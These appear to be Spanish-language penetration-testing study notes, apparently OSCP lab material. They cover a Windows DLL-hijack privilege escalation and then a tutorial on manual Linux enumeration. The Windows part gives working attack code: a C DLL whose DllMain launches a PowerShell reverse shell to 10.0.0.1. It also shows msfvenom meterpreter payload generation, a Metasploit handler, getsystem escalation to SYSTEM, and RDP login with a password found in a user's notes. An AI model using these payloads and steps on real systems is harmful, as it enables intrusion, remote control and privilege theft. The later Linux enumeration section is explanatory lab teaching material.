PS C:\Users> Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\diana\Documents


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         9/16/2022  11:04 AM             38 note1.txt                                                            
-a----         9/16/2022  11:04 AM             45 note10.txt                                                           
-a----         9/16/2022  11:04 AM             38 note11.txt                                                           
-a----         9/16/2022  11:04 AM             44 note12.txt                                                           
-a----         9/16/2022  11:04 AM             78 note13.txt                                                           
-a----         9/16/2022  11:04 AM             62 note14.txt                                                           
-a----         9/16/2022  11:04 AM             90 note15.txt                                                           
-a----         9/16/2022  11:04 AM             57 note16.txt                                                           
-a----         9/16/2022  11:04 AM             78 note17.txt                                                           
-a----         9/16/2022  11:04 AM             55 note18.txt                                                           
-a----         9/16/2022  11:04 AM             69 note19.txt                                                           
-a----         9/16/2022  11:04 AM             61 note2.txt                                                            
-a----         9/16/2022  11:04 AM            104 note20.txt                                                           
-a----         9/16/2022  11:04 AM             53 note21.txt                                                           
-a----         9/16/2022  11:04 AM              0 note22.txt                                                           
-a----         9/16/2022  11:04 AM             81 note3.txt                                                            
-a----         9/16/2022  11:04 AM             77 note4.txt                                                            
-a----         9/16/2022  11:04 AM             45 note5.txt                                                            
-a----         9/16/2022  11:04 AM             87 note6.txt                                                            
-a----         9/16/2022  11:04 AM             82 note7.txt                                                            
-a----         9/16/2022  11:04 AM             55 note8.txt                                                            
-a----         9/16/2022  11:04 AM             38 note9.txt                                                            


PS C:\Users> cd diana\Documents
cd diana\Documents
PS C:\Users\diana\Documents> type note*
type note*
Passwordless????? Zero trust????????
Fearless transparent nothing to hide. Check
microchip shortage - call DevOps/IT?
Get rental confirmation receipt from Handy
Where are provisioning scripts stored? Passwords should be hashed on them???
MS.17 010? MS 08-067? Phase out XP OT boxes within the year.
Board wants us to change all passwords every 10 days for security? Roll out by end of Q2
TODO: remove certutil.exe - being used by APTs (NGOs??)
15.20 for lunch, my split, burgr from intern jim - maybe payroll/hr ask them
who's responsible for Jenkins? ask Alex after holiday
IN PROGRESS: move all internal backup services to not run as SYSTEM
Default password for new resets will be WelcomeToWinter0121
Alex's password expired, but he's on holiday for the next 4 weeks. Password reset by IT to the default
PTO being phased out - HR being replaced with SaaS?
new directive: Security team is being outsourced end of Q3. Look on freelancer?
"In the midst of chaos, there is also opportunity." - Sun Tzu. look this up
remember to bring PDFs to the board meeting
security are mentioning domain administrator (??) compromise - look into it next week
Apparently they have SSH for Windows now? Remove netcat hack when ssh is working
Fall (autumn?), Winter, end of the year - Accounts???
Point by point refutation statements
```

Así, descubrimos las credenciales, Alex:WelcomeToWinter0121 y nos logeamos a través de RDP.

```
xfreerdp /u:alex /p:WelcomeToWinter0121 /v:192.168.223.222 /drive:home,/home/kali
```

Una vez en el sistema, descubirmos un servicio ejecutándose a través de un binario no modificable pero si leíble:

```
PS C:\Users\alex> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} | Select-String -Pattern "system32*" -NotMatch

@{Name=EnterpriseService; State=Running; PathName="C:\Services\EnterpriseService.exe"}

PS C:\Users\alex> icacls C:\Services\EnterpriseService.exe
C:\Services\EnterpriseService.exe NT AUTHORITY\SYSTEM:(F)
                                  BUILTIN\Administrators:(F)
                                  BUILTIN\Users:(RX)

PS C:\Users\alex> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'EnterpriseService'}

Name              StartMode
----              ---------
EnterpriseService Auto
```

Transportamos este binario sobre un host Windows con Procmon instalado y revisamos las DLLs. Observamos que tras imponer varios filtros en Procmon:

```
ProcessName | is | EnterpriseService | Include
Operation | is | CreateFile | Include
```

Y habilitar el servicio e iniciarlo:

```
C:\Windows\system32>sc.exe create EnterpriseService binPath= "C:\Services\EnterpriseService.exe"
[SC] CreateService CORRECTO

C:\Windows\system32>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. Todos los derechos reservados.

Prueba la nueva tecnología PowerShell multiplataforma https://aka.ms/pscore6

C:\Windows\system32> sc.exe start EnterpriseService
```

Vemos que intenta cargar una dll desde el mismo directorio en el que se encuentra el ejecutable del servicio:

```
C:\Services\EnterpriseServiceOptional.dll
```

Comprobamos que tenemos permisos de escritura sobre dicho directorio:

```
C:\Users\alex>icacls C:\Services
C:\Services BUILTIN\Administrators:(I)(OI)(CI)(F)
            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
            BUILTIN\Users:(I)(OI)(CI)(RX)
            NT AUTHORITY\Authenticated Users:(I)(M)
            NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
```

Así, subimos un binario de Netcat al mismo directoriofabricamos el siguiente código en Kali el siguiente código:

```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Y el siguiente comando para fabricar una DLL efectiva:

```
x86_64-w64-mingw32-gcc code --shared -o EnterpriseServiceOptional.dll
```

Subimos la librería a nuestra carpeta de descarga y reiniciamos el servicio:

```
C:\Users\alex>sc.exe stop EnterpriseService

SERVICE_NAME: EnterpriseService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Users\alex>sc.exe start EnterpriseService

SERVICE_NAME: EnterpriseService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 1300
        FLAGS              :
```

Seguidamente, en un listener establecido previamente obtendremos una conexión :

```
┌──(kali㉿kali)-[~]
└─$ nc -lvp 4444
listening on [any] 4444 ...
192.168.246.222: inverse host lookup failed: Unknown host
connect to [192.168.45.213] from (UNKNOWN) [192.168.246.222] 51891
dir


    Directory: C:\Windows\system32


```

Examinando el contexto del usuario actual observamos que tiene habilitado el SeImpersonatePrivilege:

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeBackupPrivilege             Back up files and directories             Disabled
SeRestorePrivilege            Restore files and directories             Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
[...]
```

Y por tanto podría ser vulnerable a PrintSpoofer.exe. Sin embargo, para mayor seguridad, creamos y transportamos un meterpreter payload:

```
tun0=$(hostname -I | cut -d " " -f2);msfvenom -p windows/x64/meterpreter_reverse_tcp -f exe LHOST=$tun0 LPORT=4444 > payload.exe
```

Y lo ejecutamos para abrir una sesión meterpreter después de activar msfconsoel:

```
┌──(kali㉿kali)-[~/Documents/OSCP]
└─$ msfconsole -x "use multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST tun0; set LPORT 4444; run"
[...]
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/meterpreter_reverse_tcp
LHOST => tun0
LPORT => 4444
[*] Started reverse TCP handler on 192.168.45.213:4444 
[*] Meterpreter session 1 opened (192.168.45.213:4444 -> 192.168.246.222:51926) at 2023-07-23 08:14:39 -0400

meterpreter > getuid
Server username: CLIENTWK222\enterpriseuser
```

Y a raiz de ahí, escalamos privilegios:

```
meterpreter > getsystem
...got system via technique 6 (Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

<br />

### 3. Linux Privilege Escalation.
#### 3.1. Enumerating Linux.
##### 3.1.1. Understanding Files and Users Privileges on Linux.

Antes de discutir técnicas específicas de escalada de privilegios, recapitulemos los privilegios y controles de acceso de Linux.

Una de las características que definen a Linux y otros derivados de UNIX es que la mayoría de los recursos, incluidos archivos, directorios, dispositivos e incluso comunicaciones de red, están representados en el sistema de archivos. Dicho coloquialmente, "todo es un fichero", es decir; todo en Linux se entienden como un objeto del que se lee output, sobre el que se escribe input o del que se ejecuta código.

Cada archivo (y por extensión cada elemento de un sistema Linux) cumple con la estructura de permisos de usuario-grupo basada ​​en tres acciones principales ya mencionadas anteriormente: 

- read - r - Leer el contenido del fichero o listar los contenidos del directorio.
- write - w - Modificar el contenido del fichero o crear/borrar un archivo dentro del directorio.
- execute - x - Ejecutar el contenido del fichero o a travesar el directorio hacia subdirectorios.

A su vez, dado un fichero, estas acciones se regulan para todos los usuarios atendiendo a tres categorías bien diferenciadas; el propietario del fichero, el grupo propietario del fichero y cualquier otro usuario.

Cada permiso (rwx) permite que la colección designada de usuarios realice diferentes acciones dependiendo de si el recurso es un archivo o un directorio.

Para archivos, 'r' permite leer el contenido del archivo, 'w' permite cambiar su contenido y 'x' permite ejecutar el archivo. 

Un directorio se maneja de manera diferente a un archivo. El acceso de lectura da derecho a consultar la lista de sus contenidos (archivos y directorios). El acceso de escritura permite crear o eliminar archivos. Finalmente, el acceso de ejecución permite cruzar el directorio para acceder a su contenido (usando el comando cd, por ejemplo). Poder atravesar un directorio sin poder leerlo le da permiso al usuario para acceder a las entradas conocidas, pero solo sabiendo su nombre exacto.

Examinemos una combinación simple de esos permisos de archivo usando un ejemplo del mundo real en nuestra máquina Kali local, ya que está basada en la distribución Linux Debian.

```
kali@kali:~$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1751 May  2 09:31 /etc/shadow
```

Para cada categoría de usuario, se muestran los tres permisos de acceso diferentes. El primer guión que encontramos describe el tipo de archivo. Dado que no está estrictamente relacionado con los permisos de archivo, podemos ignorarlo con seguridad.

Los tres caracteres siguientes muestran los permisos del propietario del archivo ( _raíz_ ), que son _rw-_ , lo que significa que el propietario tiene privilegios de lectura y escritura, pero no de ejecución. A continuación, al propietario del grupo _oculto_ solo se le ha otorgado acceso de lectura, ya que los indicadores de escritura y ejecución no están establecidos. Finalmente, al grupo de otros no se le ha otorgado ningún derecho de acceso a este archivo.

Ahora podemos aplicar este conocimiento introductorio sobre los permisos de archivos de Linux mientras realizamos la enumeración de escalada de privilegios en la siguiente sección.

<br />

##### 3.1.2. Manual Enumeration.

La enumeración manual de sistemas Linux puede llevar mucho tiempo. Sin embargo, este enfoque permite un resultado más controlado porque ayuda a identificar métodos de escalada de privilegios más peculiares que las herramientas automatizadas suelen pasar por alto.

Además, la enumeración automatizada no puede reemplazar la investigación manual porque es probable que las configuraciones personalizadas (aquellas que no pueden ser predecidas y que por tanto las herramientas automatizadas pasan por alto) de las máquinas víctimas sean exactamente las vulnerables por mal configuración.

Algunos de los comandos de este módulo pueden requerir modificaciones menores según la versión del sistema operativo sobre el que se aplican. Además, no todos los comandos presentados en esta sección serán reproducibles en los clientes dedicados.

**User Context**

Al obtener acceso inicial a un objetivo, una de las primeras cosas que debemos identificar es el contexto del usuario. 

Podemos usar el comando *id*  para recopilar información de contexto del usuario. Podemos hacerlo conectándonos a través de SSH como el usuario _joe_ a nuestra máquina de laboratorio Debian.

```
joe@debian-privesc:~$ id 
uid=1000(joe) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
```

El resultado revela que estamos operando como el usuario _joe_ , que tiene un identificador de usuario (UID) y un identificador de grupo (GID) de 1000. El usuario joe también forma parte de otros grupos que están fuera del alcance de este módulo.

Para enumerar todos los usuarios, simplemente podemos leer el contenido del archivo */etc/passwd*.

```
joe@debian-privesc:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
...
Debian-gdm:x:117:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
joe:x:1000:1000:joe,,,:/home/joe:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
eve:x:1001:1001:,,,:/home/eve:/bin/bash
```

El archivo *passwd* enumera varias cuentas de usuario, incluidas las cuentas utilizadas por varios ser<vicios en la máquina de destino, como _www-data_ y _sshd_ . Esto indica que es probable que un servidor web y un servidor SSH estén instalados en el sistema.

Ahora podemos hacer zoom en los datos de nuestro usuario actual:

- *Login Name*: "joe": indica el nombre de usuario utilizado para iniciar sesión.

- *Encrypted Password*: "x": este campo normalmente contiene la versión cifrada de la contraseña del usuario. En este caso, el valor _x_ significa que el hash de contraseña completo está contenido en el archivo **/etc/shadow**.
   
- *UID*: "1000": aparte del usuario raíz que siempre tiene un UID de _0_ , Linux comienza a contar los ID de usuario normales a partir de 1000. Este valor también se denomina _ID de usuario real_ .
  
- *GID*: "1000": representa el ID de grupo específico del usuario.
   
- *Comentario*: "joe,,,": este campo generalmente contiene una descripción sobre el usuario, a menudo simplemente repitiendo la información del nombre de usuario.
   
- *Carpeta de inicio*: "/home/joe": describe el directorio de inicio del usuario que se solicita al iniciar sesión.

- *Shell de inicio de sesión*: "/bin/bash": indica el shell interactivo predeterminado, si existe.
   

Además del usuario _joe_ , también notamos otro usuario llamado _eve_ , y podemos inferir que este es un usuario estándar ya que tiene una carpeta de inicio configurada **/home/eve** . Por otro lado, los servicios del sistema se configuran con la carpeta de inicio **/usr/sbin/nologin** , donde la instrucción _nologin_ se usa para bloquear cualquier inicio de sesión remoto o local para las cuentas de servicio.

Enumerar a todos los usuarios en una máquina de destino puede ayudar a identificar posibles cuentas de usuario con privilegios elevados a las que podríamos apuntar en un intento de elevar nuestros privilegios.

<br />

**System Info**

A continuación, el *hostname* de una máquina a menudo puede proporcionar pistas sobre sus roles funcionales. La mayoría de las veces, los nombres de host incluirán abreviaturas identificables como _web_ para un servidor web, _db_ para un servidor de base de datos, _dc_ para un controlador de dominio, etc.

En la mayoría de las distribuciones de Linux, podemos encontrar el nombre de host incrustado en el símbolo del sistema. Sin embargo, debemos confiar solo en los comandos del sistema para recuperar la información del objetivo, ya que a veces el texto del indicador puede ser engañoso.

Podemos descubrir el nombre de host con el comando **hostname** con el nombre apropiado .

```
joe@debian-privesc:~$ hostname
debian-privesc
```

Las empresas a menudo imponen un esquema de convención de nomenclatura para los hostnames, de modo que puedan clasificarse por ubicación, descripción, sistema operativo y nivel de servicio. En nuestro caso, el nombre de host se compone de solo dos partes: el tipo de sistema operativo y la descripción.

Identificar la función de una máquina puede ayudarnos a centrar nuestros esfuerzos de recopilación de información al aumentar el contexto que rodea al host.

En algún momento durante el proceso de escalada de privilegios, es posible que debamos confiar en las vulnerabilidades del kernel que explotan específicamente las vulnerabilidades en el núcleo del sistema operativo de un objetivo. Estos tipos de exploits están diseñados para un tipo de objetivo muy específico, especificado por una combinación particular de sistema operativo y versión. Dado que atacar un objetivo con un exploit de kernel no coincidente puede provocar inestabilidad en el sistema o incluso un bloqueo, debemos recopilar información precisa sobre el objetivo.

Cualquier inestabilidad del sistema causada por nuestra actividad de prueba de penetración probablemente alertaría a los administradores del sistema antes que cualquier equipo SOC. Por esta razón, debemos tener el doble de cuidado al tratar con vulnerabilidades del kernel y, cuando sea posible, probar las vulnerabilidades en un entorno local de antemano.

Los archivos **/etc/issue** y **/etc/\*-release** contienen información sobre la versión y el lanzamiento del sistema operativo. También podemos ejecutar el comando **uname -a** 

```
joe@debian-privesc:~$ cat /etc/issue
Debian GNU/Linux 10 \n \l

joe@debian-privesc:~$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=busterunauna
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"

joe@debian-privesc:~$ uname -a
Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30)
x86_64 GNU/Linux
```

Los archivos **issue** y **os-release** ubicados en el directorio **/etc** contienen la versión del sistema operativo (Debian 10) e información específica de la versión, incluido el nombre en clave de la distribución (buster). El comando **uname -a** genera la versión del kernel (4.19.0) y la arquitectura (x86_64).

<br />

**Services and Process**

A continuación, exploremos qué procesos y servicios en ejecución pueden permitirnos elevar nuestros privilegios. Para que esto ocurra, el proceso debe ejecutarse en el contexto de una cuenta privilegiada y debe tener permisos inseguros o permitirnos interactuar con él de forma no deseada.

Podemos enumerar los procesos del sistema (incluidos los ejecutados por usuarios privilegiados) con el comando **ps**. Usaremos los indicadores **a** y **x** para enumerar todos los procesos con o sin un tty y el indicador **u** para enumerar los procesos en un formato legible por el usuario.

```
joe@debian-privesc:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.4 169592 10176 ?        Ss   Aug16   0:02 /sbin/init
...
colord     752  0.0  0.6 246984 12424 ?        Ssl  Aug16   0:00 /usr/lib/colord/colord
Debian-+   753  0.0  0.2 157188  5248 ?        Sl   Aug16   0:00 /usr/lib/dconf/dconf-service
root       477  0.0  0.5 179064 11060 ?        Ssl  Aug16   0:00 /usr/sbin/cups-browsed
root       479  0.0  0.4 236048  9152 ?        Ssl  Aug16   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       486  0.0  1.0 123768 22104 ?        Ssl  Aug16   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       510  0.0  0.3  13812  7288 ?        Ss   Aug16   0:00 /usr/sbin/sshd -D
root       512  0.0  0.3 241852  8080 ?        Ssl  Aug16   0:00 /usr/sbin/gdm3
root       519  0.0  0.4 166764  8308 ?        Sl   Aug16   0:00 gdm-session-worker [pam/gdm-launch-environment]
root       530  0.0  0.2  11164  4448 ?        Ss   Aug16   0:03 /usr/sbin/apache2 -k start
root      1545  0.0  0.0      0     0 ?        I    Aug16   0:00 [kworker/1:1-events]
root      1653  0.0  0.3  14648  7712 ?        Ss   01:03   0:00 sshd: joe [priv]
root      1656  0.0  0.0      0     0 ?        I    01:03   0:00 [kworker/1:2-events_power_efficient]
joe       1657  0.0  0.4  21160  8960 ?        Ss   01:03   0:00 /lib/systemd/systemd --user
joe       1658  0.0  0.1 170892  2532 ?        S    01:03   0:00 (sd-pam)
joe       1672  0.0  0.2  14932  5064 ?        S    01:03   0:00 sshd: joe@pts/0
joe       1673  0.0  0.2   8224  5020 pts/0    Ss   01:03   0:00 -bash
root      1727  0.0  0.0      0     0 ?        I    03:00   0:00 [kworker/0:0-ata_sff]
root      1728  0.0  0.0      0     0 ?        I    03:06   0:00 [kworker/0:2-ata_sff]
joe       1730  0.0  0.1  10600  3028 pts/0    R+   03:10   0:00 ps axu
```

El resultado enumera varios procesos que se ejecutan como root que vale la pena investigar para detectar posibles vulnerabilidades. Notaremos que el comando **ps** que ejecutamos también aparece en la salida, propiedad del usuario actual. También podemos filtrar el proceso de propiedad del usuario específico de la salida con el nombre de usuario apropiado.

<br />

**Networking**

El siguiente paso en nuestro análisis del host de destino es revisar las interfaces de red, las rutas y los puertos abiertos disponibles. Esta información puede ayudarnos a determinar si el objetivo comprometido está conectado a varias redes y, por lo tanto, podría usarse como pivote. La presencia de interfaces virtuales específicas también puede indicar la existencia de software antivirus o de virtualización.

Un atacante puede usar un objetivo comprometido para girar o moverse entre redes conectadas. Esto amplificará la visibilidad de la red y permitirá que el atacante se dirija a los hosts a los que no se puede acceder directamente desde la máquina de ataque original.

También podemos investigar los enlaces de puertos para ver si un servicio en ejecución solo está disponible en una dirección de bucle invertido, en lugar de en una enrutable. Investigar un programa o servicio privilegiado escuchando en la interfaz de loopback podría expandir nuestra superficie de ataque y aumentar nuestra probabilidad de éxito en un ataque de escalada de privilegios.

Dependiendo de la versión de Linux, podemos listar la configuración TCP/IP de cada adaptador de red con **ifconfig** o **ip**. Mientras que el primer comando muestra las estadísticas de la interfaz, el último proporciona una versión compacta de la misma información. Ambos comandos aceptan la opción **a** para mostrar toda la información disponible.

```
joe@debian-privesc:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:8a:b9:fc brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.214/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:b9fc/64 scope link
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:8a:72:64 brd ff:ff:ff:ff:ff:ff
    inet 172.16.60.214/24 brd 172.16.60.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:7264/64 scope link
       valid_lft forever preferred_lft forever
```

Según el resultado anterior, el cliente de Linux también está conectado a más de una red.

Podemos mostrar routing tables con **route** o **routel**, dependiendo de la distribución y versión de Linux. Ambos comandos proporcionan información similar.

```
joe@debian-privesc:~$ routel
         target            gateway          source    proto    scope    dev tbl
/usr/bin/routel: 48: shift: can't shift that many
        default     192.168.50.254                   static          ens192
    172.16.60.0 24                   172.16.60.214   kernel     link ens224
   192.168.50.0 24                  192.168.50.214   kernel     link ens192
      127.0.0.0          broadcast       127.0.0.1   kernel     link     lo local
      127.0.0.0 8            local       127.0.0.1   kernel     host     lo local
      127.0.0.1              local       127.0.0.1   kernel     host     lo local
127.255.255.255          broadcast       127.0.0.1   kernel     link     lo local
    172.16.60.0          broadcast   172.16.60.214   kernel     link ens224 local
  172.16.60.214              local   172.16.60.214   kernel     host ens224 local
  172.16.60.255          broadcast   172.16.60.214   kernel     link ens224 local
   192.168.50.0          broadcast  192.168.50.214   kernel     link ens192 local
 192.168.50.214              local  192.168.50.214   kernel     host ens192 local
 192.168.50.255          broadcast  192.168.50.214   kernel     link ens192 local
            ::1                                      kernel              lo
         fe80:: 64                                   kernel          ens224
         fe80:: 64                                   kernel          ens192
            ::1              local                   kernel              lo local
fe80::250:56ff:fe8a:7264              local                   kernel          ens224 local
fe80::250:56ff:fe8a:b9fc              local                   kernel          ens192 local
```

Finalmente, podemos mostrar las conexiones de red activas y los puertos de escucha usando **netstat** o **ss** , los cuales aceptan los mismos argumentos.

Por ejemplo, podemos enumerar todas las conexiones con **-a** , evitar la resolución del nombre de host (que puede detener la ejecución del comando) con **-n** y enumerar el nombre del proceso al que pertenece la conexión con **-p** . Podemos combinar los argumentos y simplemente ejecutar **ss -anp** :

```
joe@debian-privesc:~$ ss -anp
Netid      State       Recv-Q      Send-Q                                        Local Address:Port                     Peer Address:Port
nl         UNCONN      0           0                                                         0:461                                  *
nl         UNCONN      0           0                                                         0:323                                  *
nl         UNCONN      0           0                                                         0:457                                  *
...
udp        UNCONN      0           0                                                      [::]:47620                            [::]:*
tcp        LISTEN      0           128                                                 0.0.0.0:22                            0.0.0.0:*
tcp        LISTEN      0           5                                                 127.0.0.1:631                           0.0.0.0:*
tcp        ESTAB       0           36                                           192.168.50.214:22                      192.168.118.2:32890
tcp        LISTEN      0           128                                                       *:80                                  *:*
tcp        LISTEN      0           128                                                    [::]:22                               [::]:*
tcp        LISTEN      0           5                                                     [::1]:631                              [::]:*
```

El resultado enumera los diversos puertos de escucha y las sesiones activas, incluida nuestra propia conexión SSH activa y su conector de escucha.

Continuando con nuestra enumeración de referencia, centrémonos a continuación en las reglas de firewall.

En general, estamos interesados ​​principalmente en el estado, el profile y las reglas de un firewall durante la fase de pentesting. Sin embargo, esta información también puede ser útil durante la escalada de privilegios. Por ejemplo, si un servicio de red no es accesible de forma remota porque está bloqueado por el firewall, generalmente se puede acceder a él localmente a través de la interfaz de red loopback. Si podemos interactuar con estos servicios localmente, podemos explotarlos para escalar nuestros privilegios en el sistema local.

Durante esta fase, también podemos recopilar información sobre el filtrado de puertos entrantes y salientes para facilitar el reenvío y la tunelización de puertos cuando sea el momento de cambiar a una red interna.

En los sistemas basados ​​en Linux, debemos tener privilegios de raíz para enumerar las reglas de firewall con *iptables*. Sin embargo, dependiendo de cómo esté configurado el firewall, es posible que podamos obtener información sobre las reglas como un usuario estándar.

Por ejemplo, el paquete _iptables-persistent_ en Debian Linux guarda las reglas del firewall en archivos específicos en **/etc/iptables** de forma predeterminada. El sistema utiliza estos archivos para restaurar las reglas _de netfilter_ en el momento del arranque. Estos archivos a menudo se dejan con permisos débiles, lo que les permite ser leídos por cualquier usuario local en el sistema de destino.

También podemos buscar archivos creados por el comando _iptables-save_ , que se usa para volcar la configuración del firewall en un archivo especificado por el usuario. Este archivo generalmente se usa como entrada para el comando _iptables-restore_ y se usa para restaurar las reglas del firewall en el momento del arranque. Si un administrador del sistema alguna vez ejecutó este comando, podríamos buscar en el directorio de configuración ( **/etc** ) o grep en el sistema de archivos para los comandos de iptables para ubicar el archivo. Si el archivo tiene permisos inseguros, podríamos usar el contenido para inferir las reglas de configuración del firewall que se ejecutan en el sistema.

```
joe@debian-privesc:~$ cat /etc/iptables/rules.v4
# Generated by xtables-save v1.8.2 on Thu Aug 18 12:53:22 2022
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -p tcp -m tcp --dport 1999 -j ACCEPT
COMMIT
# Completed on Thu Aug 18 12:53:22 2022
```

Dado que este archivo es de solo lectura para cualquier usuario que no sea root, podemos inspeccionar su contenido. Notaremos una regla no predeterminada que permite explícitamente el puerto de destino _1999_ . Este detalle de configuración se destaca y debe tenerse en cuenta para una investigación posterior.

<br />

**Scheduled Tasks (Cron)**

A continuación, examinemos las tareas programadas que los atacantes suelen aprovechar durante los ataques de escalada de privilegios. Los sistemas que actúan como servidores a menudo ejecutan periódicamente varias tareas programadas y automatizadas. Cuando estos sistemas están mal configurados, o los archivos creados por el usuario se quedan con permisos inseguros, podemos modificar estos archivos que serán ejecutados por el sistema de programación con un alto nivel de privilegio.

El programador de trabajos basado en Linux se conoce como _cron_. Las tareas programadas se enumeran en los directorios **/etc/cron.*** , donde _*_ representa la frecuencia con la que se ejecutará la tarea. Por ejemplo, las tareas que se ejecutarán diariamente se pueden encontrar en **/etc/cron.daily** . Cada script aparece en su propio subdirectorio.

```
joe@debian-privesc:~$ ls -lah /etc/cron*
-rw-r--r-- 1 root root 1.1K Oct 11  2019 /etc/crontab

/etc/cron.d:
total 24K
drwxr-xr-x   2 root root 4.0K Aug 16 04:25 .
drwxr-xr-x 120 root root  12K Aug 18 12:37 ..
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
-rw-r--r--   1 root root  285 May 19  2019 anacron

/etc/cron.daily:
total 60K
drwxr-xr-x   2 root root 4.0K Aug 18 09:05 .
drwxr-xr-x 120 root root  12K Aug 18 12:37 ..
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x   1 root root  311 May 19  2019 0anacron
-rwxr-xr-x   1 root root  539 Aug  8  2020 apache2
-rwxr-xr-x   1 root root 1.5K Dec  7  2020 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root  384 Dec 31  2018 cracklib-runtime
-rwxr-xr-x   1 root root 1.2K Apr 18  2019 dpkg
-rwxr-xr-x   1 root root 2.2K Feb 10  2018 locate
-rwxr-xr-x   1 root root  377 Aug 28  2018 logrotate
-rwxr-xr-x   1 root root 1.1K Feb 10  2019 man-db
-rwxr-xr-x   1 root root  249 Sep 27  2017 passwd

/etc/cron.hourly:
total 20K
